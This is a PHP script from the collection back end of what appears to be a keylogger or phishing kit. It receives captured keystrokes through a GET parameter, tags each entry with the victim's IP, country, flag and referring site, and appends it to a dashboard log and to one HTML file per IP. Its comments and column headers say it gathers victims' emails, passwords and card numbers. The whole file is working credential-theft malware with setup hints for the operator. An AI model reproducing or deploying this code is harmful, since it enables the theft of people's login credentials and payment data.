<?php


// You can change any time .YOUR DATETIMEZONE

    include "country/bots.php"; // if you want block IP
    include "country/index.php"; // display country
    include 'country/geoip.inc';

    if($_GET){

        $gi = geoip_open("country/GeoIP.dat", "");

        $ip = $_SERVER['REMOTE_ADDR'] ;


        // SET YOUR DATETIME ZONE please just your continent and the capital of your country
        // for exemple Europe/Paris  see at here https://www.php.net/manual/fr/timezones.php

        $date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE HERE
        $d =  $date->format('d/m/Y H:i:s');
        $country = geoip_country_id_by_addr($gi, $ip);
        
        $flag = '<img src="../country/img/flags/'.strtolower(geoip_country_code_by_addr($gi,$ip)).'.png">';

        $log = $_GET['values']; 
        $referer = $_SERVER['HTTP_REFERER']; // web site name

        
      
          $txt = '<html>
<head>
    <style>
       
        .box1D {
            border-radius:5px 5px 5px 5px;
            transition: box-shadow 0.2s;
        }
        .box1D:hover {
            box-shadow: 3px 3px 3px 3px #000;
            border:solid 0.5px #fff;
            border-radius: 10px;
        }

        .box2D {
            border-radius:5px 5px 5px 5px;
            transition: box-shadow 0.2s;
        }
        .box2D:hover {
            box-shadow: 3px 3px 3px 3px #000;
            border:solid 0.5px #fff;
            border-radius: 10px;
        }

    </style>
    <title>view_logs</title>
    <link rel="stylesheet" href="../bootstrap/css/bootstrap.min.css">
</head>
<body width="500">
    <script src="../bootstrap/js/jquery-3.2.1.slim.min.js"></script>
    <script src="../bootstrap/js/popper.min.js"></script>
    <script src="../bootstrap/js/bootstrap.min.js"></script>
<table class="table table-striped" border="1">
  <thead class="thead-dark">
    <tr>
      <th>IP_DATE_HEURE</th>
      <th>Email /Password /CC ...etc</th>
      <th>Web Site</th>
          <tr> <th scope="row">'
          .$ip.'<br>'.$geoplugin->countryName.'&nbsp;'.$flag.''.$d.'</th> 
          <td width="60%" class="box1D"> '.$log.'
          <td width="40%" class="box2D"> '.$referer.' 

          </td> </tr>' ;

        // myfille2 is to display All victimes infos see login page
        
         $txt2 ='<tr> <th scope="row">'.$ip.'<br>'.$geoplugin->countryName.'&nbsp;'.$flag.''.$d.' </th> 
          <td width="60%" class="box1D"> '.$log.'
          <td width="40%" class="box2D"> '.$referer.' 

          </td> </tr>';


        $myfile2 = fopen("dashboard/log.html", "a+") or die("Unable to open file!");
        
        fwrite($myfile2, $txt2);
        fclose($myfile2);



        $myfile = "keystrokes/".$_SERVER['REMOTE_ADDR'].".html";  // retrieve victim data in a single html file
        $myfile = fopen($myfile, "a") or die("Unable to open file!");

        fwrite($myfile, $txt);
        fclose($myfile);

    }

?>